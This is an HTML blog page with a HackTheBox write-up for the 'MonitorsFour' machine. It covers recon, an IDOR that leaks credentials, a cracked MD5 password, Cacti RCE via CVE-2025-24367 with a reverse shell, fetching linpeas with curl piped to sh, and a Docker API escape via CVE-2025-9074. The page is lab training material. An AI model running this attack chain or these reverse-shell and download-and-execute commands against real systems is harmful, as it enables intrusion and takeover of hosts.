<!DOCTYPE html>
<html lang="en-us">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <title>
MonitorsFour | ARTIFACTS
</title>

    <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="">

<meta name="generator" content="Hugo 0.152.2">


<link rel="canonical" href="http://localhost:1313/captures/monitorsfour/" >




<link href="/css/style.min.5f46e10d3d75c0ba6553d0749280b20ce50648a191585d2b90bfa5a77f1653cd.css" rel="stylesheet">




</head>

<body>

    <div class="flexWrapper">
        <header class="headerWrapper">
    <div class="header">
        <div>
            <a class="terminal" href="/">
                <span>C-1485@artifacts.io ~ $</span>
            </a>
        </div>
        <input class="side-menu" type="checkbox" id="side-menu">
        <label class="hamb" for="side-menu"><span class="hamb-line"></span></label>
        <nav class="headerLinks">
            <ul>
                
                <li>
                    <a href="http://localhost:1313/projects" title="" >
                        ~/projects</a>
                </li>
                
                <li>
                    <a href="http://localhost:1313/captures" title="" >
                        ~/captures</a>
                </li>
                
                <li>
                    <a href="http://localhost:1313/playbooks" title="" >
                        ~/playbooks</a>
                </li>
                
                <li>
                    <a href="http://localhost:1313/about" title="" >
                        ~/about</a>
                </li>
                
            </ul>
        </nav>
    </div>
</header>


        <div class="content">
            <main class="main">
                
<div class="postWrapper">
    <h1>MonitorsFour</h1>
    

    
    
    
    

    
    
    
    
    

    
    
    
    
    

    
    
    
    

    
    
    
    

    
    
    
    

    
    
    
    

    
    <section class="postMetadata">
        <dl>
            
                <dt>tags</dt>
<dd><span></span>HackTheBox Machines</dd>
            
            
            
            
            
            
                <dt>reading time</dt>
                <dd>6 minutes</dd>
            
        </dl>
    </section>
    
    <div>
        <h4 id="write-up-for-the-hackthebox-machine---monitorsfour">Write-Up for the HackTheBox Machine - MonitorsFour</h4>
<hr>
<h4 id="001-scan">001: Scan</h4>
<p>The victim machine was scanned using <code>nmap</code>.
Ports returned from the tool were <code>port 80(http)</code> and <code>port 5985 (winrm)</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sC -sV -p- 10.10.11.98
</span></span></code></pre></div><p align="center">
  <img src="/captures/screens/MonitorsFour/shot-001.png" alt="shot-001">
</p>
<hr>
<h4 id="002-hostname-mapping">002: Hostname Mapping</h4>
<p>Then, the IP of the victim is added to <code>/etc/hosts</code> and mapped to <code>monitorsfour.htb</code> for local hostanme resolution.
Thus, the website was viewed in browser for further examination.</p>
<p align="center">
  <img src="/captures/screens/MonitorsFour/shot-002.png" alt="shot-002">
</p>
<hr>
<h4 id="003-victim-fuzz">003: Victim Fuzz</h4>
<p>As the <code>nmap</code> report showed that the application was running on nginx, additional reconnaissance for the discovery of hidden files and subdomains was made using <code>ffuf</code>.
<code>common.txt</code> wordlist exposed various paths, but what seemed most interesting was the <strong>Warning</strong> from <code>/contact</code> response.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -u http://monitorsfour.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -ac
</span></span></code></pre></div><ul>
<li><code>-ac</code> | switch specifies auto-calibration, which filters out false positive responses</li>
</ul>
<p align="center">
  <img src="/captures/screens/MonitorsFour/shot-003.png" alt="shot-003">
</p>
<p>Initially, the response appeared like a hint that the victim may be vulnerable to File Inclusion.
But after some common LFI probes to <code>/contact</code> and <code>/Router</code>, no results were found of potential vulnerability.
However, <code>/Router.php</code> when tested in <code>burpsuite</code> all responses returned <code>200 OK</code>, meaning that requests were handled on the server.</p>
<p align="center">
  <img src="/captures/screens/MonitorsFour/shot-004.png" alt="shot-004">
</p>
<p>Additionally, <code>/user</code> returned an error message, stating that a token paramenter is missing.</p>
<p align="center">
  <img src="/captures/screens/MonitorsFour/shot-006.png" alt="shot-006">
</p>
<hr>
<h4 id="004-virtual-host">004: Virtual Host</h4>
<p><code>/Router.php</code> was assumed to be a front controller, since it is explicitly named <code>Router</code> and calls a prefix path <code>/var/www/app/</code>, which basically implied a centralized request handler to other website components.
Hence, with <code>ffuf</code> the victim was probed for hidden subdomains.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -u http://FUZZ.monitorsfour.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac
</span></span></code></pre></div><p>Enumeration for DNS subdomains returned nothing.
But, then the logical next step was probing for any virtual host.
After few seconds virtual host <code>cacti</code> was found with a redirection status <code>302</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -u http://FUZZ.monitorsfour.htb/ -H <span style="color:#e6db74">&#34;Host: FUZZ.monitorsfour.htb&#34;</span> -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac
</span></span></code></pre></div><ul>
<li><code>-H</code> | switch specifies virtual host fuzzing</li>
</ul>
<p align="center">
  <img src="/captures/screens/MonitorsFour/shot-005.png" alt="shot-005">
</p>
<hr>
<h4 id="005-idor">005: IDOR</h4>
<p>At this point, from what was found in <code>/user</code> the victim was vulnerable to IDOR.
As the error response suggested a missing parameter, <code>token=0</code> has been requested as a parameter in the URL and the target responded with sensitive credentials.</p>
<p align="center">
  <img src="/captures/screens/MonitorsFour/shot-007.png" alt="shot-007">
</p>
<hr>
<h4 id="006-md5-decryption">006: MD5 Decryption</h4>
<p><code>admin</code> user was the target user worth the most for further examination.
However, its password was encrypted with MD5.</p>
<ul>
<li><code>56b32eb43e6f15395f6c46c1c9e1cd36</code></li>
</ul>
<p>Hence, 
<a href="https://iotools.cloud/tool/md5-decrypt/" target="_blank" rel="noopener">https://iotools.cloud/tool/md5-decrypt/</a>
 successfully decrypted the found password resulting to a more sensible text.</p>
<ul>
<li><code>wonderful1</code></li>
</ul>
<p align="center">
  <img src="/captures/screens/MonitorsFour/shot-008.png" alt="shot-008">
</p>
<hr>
<h4 id="007-cacti-login">007: Cacti Login</h4>
<p>The username <code>admin</code> along with the decrypted password <code>wonderful1</code> were entered in the <code>cacti</code> log in page, but the credentials denied access.
Regardless, since it was assumed that the cracked password was correct, the <code>name</code> of the <code>admin</code> user was entered as a username instead.
Which successfully allowed access to the <code>cacti</code> dashboard.</p>
<ul>
<li><code>username: marcus</code></li>
</ul>
<p align="center">
  <img src="/captures/screens/MonitorsFour/shot-009.png" alt="shot-009">
</p>
<hr>
<h4 id="008-cve-2025-24367">008: CVE-2025-24367</h4>
<p>According to 
<a href="https://www.cvedetails.com/vulnerability-list/vendor_id-7458/product_id-12584/version_id-1907377/year-2025/opec-1/Cacti-Cacti-1.2.28.html" target="_blank" rel="noopener">https://www.cvedetails.com/vulnerability-list/vendor_id-7458/product_id-12584/version_id-1907377/year-2025/opec-1/Cacti-Cacti-1.2.28.html</a>
 the target was vulnerable to RCE, labeled as <code>CVE-2025-24367</code>.</p>
<p align="center">
  <img src="/captures/screens/MonitorsFour/shot-010.png" alt="shot-010">
</p>
<p>A comprehensive POC against the vulnerability is found in 
<a href="https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC" target="_blank" rel="noopener">https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC</a>
.
The steps for the reverse shell process on the attacker machine were quite straight forward, since a POC was used.</p>
<hr>
<h4 id="009-reverse-shell">009: Reverse Shell</h4>
<p>Initially, the repo with the POC script was cloned.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.git
</span></span></code></pre></div><p>Then as described, a Netcat server was running locally on the attacker.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">4444</span> | switches allow listening mode on the specified port, with no DNS resolution and verbose output
</span></span></code></pre></div><p>A <code>venv</code> python virtual environment was created and activated, to enable <code>pip</code> installation of the POC required components.</p>
<ul>
<li><code>python3 -m venv venv</code></li>
<li><code>source venv/bin/activate</code></li>
<li><code>pip install requests beautifulsoup4</code></li>
</ul>
<p>Once the installation has completed, the appropriate parameters (relevant findings) were passed to the <code>exploit.py</code> for the correct execution which allowed reverse connection.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 exploit.py -u marcus -p wonderful1 -i &lt;attacker_ip&gt; -l <span style="color:#ae81ff">4444</span> -url http://cacti.monitorsfour.htb
</span></span></code></pre></div><p align="center">
  <img src="/captures/screens/MonitorsFour/shot-011.png" alt="shot-011">
</p>
<hr>
<h4 id="010-user-flag">010: User Flag</h4>
<p>A successful access to the system has been made, hence the first flag was captured by navigating to <code>/home/marcus</code> and <code>cat user.txt</code>.</p>
<ul>
<li><code>8d3a167a22052489d5280ff86bbb5304</code></li>
</ul>
<p align="center">
  <img src="/captures/screens/MonitorsFour/shot-012.png" alt="shot-012">
</p>
<hr>
<h4 id="011-linpeas-enumeration">011: Linpeas Enumeration</h4>
<p>A local python server is set up on the attacker at a location where <code>linpeas.sh</code> was located.
On the victim machine <code>linpeas.sh</code> was requested and then executed for system enumeration</p>
<ul>
<li><code>linpeas -h</code> | if <code>linpeas</code> is already installed the command will redirect to the directory where <code>linpeash.sh</code> is</li>
<li><code>sudo python3 -m http.server 80</code> | run the python server in <code>linpeas</code> directory</li>
<li><code>curl http://&lt;attacker_ip&gt;/linpeas.sh | sh</code> | on the victim machine do a GET request and then pipe to the execution of the enumeration script</li>
</ul>
<p>Based on the provided report there where various potential expoitation methods.
However one that seemed interesting was <code>/.dockerenv</code>, which signified that the system we had access to was a docker container.
Additional verification that the victim was a docker container was with the command <code>hostname</code>, which returned a random hex value <code>821fbd6a43fa</code> indicating the first 12 characters of the full docker 64 hex character id.</p>
<p align="center">
  <img src="/captures/screens/MonitorsFour/shot-013.png" alt="shot-013">
</p>
<hr>
<h4 id="012-containerization">012: Containerization</h4>
<p>Furthermore, in /etc/hosts an entry showed a self-mapping for a docker container, confirming the environment is set in a docker gateway bridge.</p>
<p align="center">
  <img src="/captures/screens/MonitorsFour/shot-014.png" alt="shot-014">
</p>
<hr>
<h4 id="013-docker-reachability">013: Docker Reachability</h4>
<p>As described the victim machine being Windows, it was assumed that the host was a Windows machine.

<a href="https://dev.to/nasrulhazim/how-to-access-your-localhost-api-from-docker-containers-7ai" target="_blank" rel="noopener">https://dev.to/nasrulhazim/how-to-access-your-localhost-api-from-docker-containers-7ai</a>
 provided a brief guide towards accessing the Docker API through a container.
<code>host.docker.internal</code> is a resolution which allows access to a host machine, specifically if it is Windows or macOS.
A probe was made to <code>host.docker.internal</code> with the use of <code>curl</code>, and the name resolution resolved to <code>192.168.65.254</code> on <code>port 80</code>.
Essentially, the command returned an output that described the container has network access to the host&rsquo;s nginx server.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -v http://host.docker.internal | switch sets <span style="color:#e6db74">`</span>curl<span style="color:#e6db74">`</span> to verbose-mode
</span></span></code></pre></div><p align="center">
  <img src="/captures/screens/MonitorsFour/shot-015.png" alt="shot-015">
</p>
<hr>
<h4 id="014-subnet-scan">014: Subnet Scan</h4>
<p>Request to <code>host.docker.internal</code> resolved to an IP with the last octet <code>.254</code>, meaning it was the Docker bridge network gateway.
Thus, the next step was a scan on the entire <code>/24</code> subnet for potential hosts that may expose Docker API.
A simple Bash script has enabled a comprehensive subnet scan utilizing <code>curl</code>, and the host <code>192.168.65.7:2375</code> gave a response .</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i in <span style="color:#66d9ef">$(</span>seq <span style="color:#ae81ff">1</span> 254<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span> <span style="color:#f92672">(</span>curl -s --connect-timeout <span style="color:#ae81ff">1</span> http://192.168.65.$i:2375/version 2&gt;/dev/null | grep -q <span style="color:#e6db74">&#34;ApiVersion&#34;</span> <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;192.168.65.</span>$i<span style="color:#e6db74">:2375&#34;</span> <span style="color:#f92672">&amp;&amp;</span> curl -v --connect-timeout <span style="color:#ae81ff">1</span> http://192.168.65.$i:2375/version 2&gt;/dev/null<span style="color:#f92672">)</span> &amp; <span style="color:#66d9ef">done</span>; wait
</span></span></code></pre></div><ul>
<li><code>loops through the 192.168.65.0/24 subnet and probes port 2375 on each host</code></li>
<li><code>identifies exposed Docker APIs by checking for ApiVersion in the response</code></li>
<li><code>prints and then verbosely queries any host that responds positively</code></li>
<li><code>executes scans in parallel and waits for all probes to finish</code></li>
</ul>
<hr>
<h4 id="015-root-flag">015: Root Flag</h4>
<p>
<a href="https://blog.qwertysecurity.com/Articles/blog3.html" target="_blank" rel="noopener">https://blog.qwertysecurity.com/Articles/blog3.html</a>
 similar to our victim&rsquo;s case, described that any container on the current Docker version can have access to the API without proper authentication.
The vulnerability is labeled as <code>CVE-2025-9074</code> and it was later patched with Docker Desktop 4.44.3.
Nevertheless, a POC was found in 
<a href="https://github.com/3rendil/CVE-2025-9074-POC" target="_blank" rel="noopener">https://github.com/3rendil/CVE-2025-9074-POC</a>
 which the allowed the accessed container to mount the host filesystem.
The script was downloaded in <code>/tmp</code> directory of the current container from our attacker local python server and then bacame executable with <code>chmod +x cve-2025-9074</code>.
After successfull execution of the POC we had access to the created container with the mounter host filesystem.
The <code>root.txt</code> was found with <code>cat /hostfs/mnt/host/c/Users/Administrator/Desktop/root.txt</code>.</p>
<ul>
<li><code>35713cf72da6c0530e65ce8f42a16e26</code></li>
</ul>
    </div>
</div>

            </main>
        </div>


        <footer class="footer">
    
        <span>
            ♣ ♦ ♠ ♥ 
        </span>
    
</footer>
    </div>

</body>

</html>
